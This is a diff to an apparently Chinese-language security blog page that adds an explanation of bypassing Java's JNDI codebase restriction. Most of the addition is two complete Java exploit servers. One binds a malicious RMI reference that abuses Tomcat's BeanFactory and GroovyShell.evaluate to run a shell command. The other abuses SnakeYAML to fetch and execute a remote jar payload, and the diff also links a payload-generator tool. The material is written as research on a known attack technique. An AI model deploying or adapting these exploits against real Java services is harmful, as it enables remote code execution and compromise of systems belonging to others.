@@ -229,6 +229,84 @@ public class <span class="hljs-type">BypassCodebase</span> {
               <a data-fancybox="gallery" href="../img/2022-3-27/2-10.jpg">
                 <img class="img-fluid" src="../img/2022-3-27/2-10.jpg" alt="">
               </a>
+              
+              <p>&nbsp;&nbsp;&nbsp;有了上面的思路，我们可以自己更改跟getObjectInstance方法加载的恶意类。
+                只要找可以传一个String参数就能RCE的方法并且在比较常见依赖库里的类，这里选择使用groovy.lang.GroovyShell#evaluate。</p>
+                
+                <div>
+                	
+                	<pre class='hljs'><code><span class="hljs-keyword">import</span> com.sun.jndi.rmi.registry.<span class="hljs-type">ReferenceWrapper</span>;
+<span class="hljs-keyword">import</span> org.apache.naming.<span class="hljs-type">ResourceRef</span>;
+
+<span class="hljs-keyword">import</span> javax.naming.<span class="hljs-type">NamingException</span>;
+<span class="hljs-keyword">import</span> javax.naming.<span class="hljs-type">StringRefAddr</span>;
+<span class="hljs-keyword">import</span> java.rmi.<span class="hljs-type">AlreadyBoundException</span>;
+<span class="hljs-keyword">import</span> java.rmi.<span class="hljs-type">RemoteException</span>;
+<span class="hljs-keyword">import</span> java.rmi.registry.<span class="hljs-type">LocateRegistry</span>;
+<span class="hljs-keyword">import</span> java.rmi.registry.<span class="hljs-type">Registry</span>;
+
+public class <span class="hljs-type">BypassCodebase2</span> {
+    public <span class="hljs-keyword">static</span> <span class="hljs-type">void</span> main(<span class="hljs-type">String</span>[] args) throws <span class="hljs-type">RemoteException</span>, <span class="hljs-type">NamingException</span>, <span class="hljs-type">AlreadyBoundException</span> {
+        <span class="hljs-type">Registry</span> registry = <span class="hljs-type">LocateRegistry</span>.createRegistry(<span class="hljs-number">1099</span>);
+        // 实例化<span class="hljs-type">Reference</span>，指定目标类为javax.el.<span class="hljs-type">ELProcessor</span>，工厂类为org.apache.naming.factory.<span class="hljs-type">BeanFactory</span>，最后一个参数是factoryLocation，为空时即可使得var8.getFactoryClassLocation()为空。
+        <span class="hljs-type">ResourceRef</span> <span class="hljs-keyword">ref</span> = new <span class="hljs-type">ResourceRef</span>(<span class="hljs-string">"groovy.lang.GroovyShell"</span>, null, <span class="hljs-string">""</span>, <span class="hljs-string">""</span>, <span class="hljs-literal">true</span>,<span class="hljs-string">"org.apache.naming.factory.BeanFactory"</span>,null);
+        // <span class="hljs-type">BeanFactory</span>.getObjectInstance 代码中获取forceString的值截取等于号后的内容作为调用的方法
+        <span class="hljs-keyword">ref</span>.add(new <span class="hljs-type">StringRefAddr</span>(<span class="hljs-string">"forceString"</span>, <span class="hljs-string">"pwn=evaluate"</span>));
+        // 利用表达式执行命令
+        <span class="hljs-keyword">ref</span>.add(new <span class="hljs-type">StringRefAddr</span>(<span class="hljs-string">"pwn"</span>, <span class="hljs-string">"\"open /System/Applications/Calculator.app\".execute()"</span>));
+        <span class="hljs-type">ReferenceWrapper</span> referenceWrapper = new <span class="hljs-type">ReferenceWrapper</span>(<span class="hljs-keyword">ref</span>);
+        registry.<span class="hljs-keyword">bind</span>(<span class="hljs-string">"evilObject"</span>, referenceWrapper);
+    }
+}</code></pre>
+                	
+                	
+                	</div>
+                	
+                	<p>&nbsp;&nbsp;&nbsp;同时，也可以利用org.yaml.snakeyaml.Yaml()#load远程加载恶意jar包。下面这个链接是yaml恶意jar包生成的工具。</p>
+
+
+							<div>
+								
+								<pre class='hljs'><code><span class="hljs-string">https:</span><span class="hljs-comment">//github.com/artsploit/yaml-payload</span></code></pre>
+								
+								</div>
+							
+							<div>
+								
+								
+								<pre class='hljs'><code><span class="hljs-keyword">import</span> com.sun.jndi.rmi.registry.<span class="hljs-type">ReferenceWrapper</span>;
+<span class="hljs-keyword">import</span> org.apache.naming.<span class="hljs-type">ResourceRef</span>;
+
+<span class="hljs-keyword">import</span> javax.naming.<span class="hljs-type">NamingException</span>;
+<span class="hljs-keyword">import</span> javax.naming.<span class="hljs-type">StringRefAddr</span>;
+<span class="hljs-keyword">import</span> java.rmi.<span class="hljs-type">AlreadyBoundException</span>;
+<span class="hljs-keyword">import</span> java.rmi.<span class="hljs-type">RemoteException</span>;
+<span class="hljs-keyword">import</span> java.rmi.registry.<span class="hljs-type">LocateRegistry</span>;
+<span class="hljs-keyword">import</span> java.rmi.registry.<span class="hljs-type">Registry</span>;
+
+public class <span class="hljs-type">BypassCodebase3</span> {
+    public <span class="hljs-keyword">static</span> <span class="hljs-type">void</span> main(<span class="hljs-type">String</span>[] args) throws <span class="hljs-type">RemoteException</span>, <span class="hljs-type">NamingException</span>, <span class="hljs-type">AlreadyBoundException</span> {
+        <span class="hljs-type">Registry</span> registry = <span class="hljs-type">LocateRegistry</span>.createRegistry(<span class="hljs-number">1099</span>);
+        // 实例化<span class="hljs-type">Reference</span>，指定目标类为javax.el.<span class="hljs-type">ELProcessor</span>，工厂类为org.apache.naming.factory.<span class="hljs-type">BeanFactory</span>，最后一个参数是factoryLocation，为空时即可使得var8.getFactoryClassLocation()为空。
+        <span class="hljs-type">ResourceRef</span> <span class="hljs-keyword">ref</span> = new <span class="hljs-type">ResourceRef</span>(<span class="hljs-string">"org.yaml.snakeyaml.Yaml"</span>, null, <span class="hljs-string">""</span>, <span class="hljs-string">""</span>, <span class="hljs-literal">true</span>,<span class="hljs-string">"org.apache.naming.factory.BeanFactory"</span>,null);
+        // yaml payload
+        <span class="hljs-type">String</span> yaml = <span class="hljs-string">"!!javax.script.ScriptEngineManager [\n"</span> +
+                <span class="hljs-string">"  !!java.net.URLClassLoader [[\n"</span> +
+                <span class="hljs-string">"    !!java.net.URL [\"http://127.0.0.1:8000/yaml-payload.jar\"]\n"</span> +
+                <span class="hljs-string">"  ]]\n"</span> +
+                <span class="hljs-string">"]"</span>;
+        // <span class="hljs-type">BeanFactory</span>.getObjectInstance 代码中获取forceString的值截取等于号后的内容作为调用的方法
+        <span class="hljs-keyword">ref</span>.add(new <span class="hljs-type">StringRefAddr</span>(<span class="hljs-string">"forceString"</span>, <span class="hljs-string">"pwn=load"</span>));
+        // 利用表达式执行命令
+        <span class="hljs-keyword">ref</span>.add(new <span class="hljs-type">StringRefAddr</span>(<span class="hljs-string">"pwn"</span>, yaml));
+        <span class="hljs-type">ReferenceWrapper</span> referenceWrapper = new <span class="hljs-type">ReferenceWrapper</span>(<span class="hljs-keyword">ref</span>);
+        registry.<span class="hljs-keyword">bind</span>(<span class="hljs-string">"evilObject"</span>, referenceWrapper);
+    }
+}</code></pre>
+								
+								</div>
+
+
 
 
 
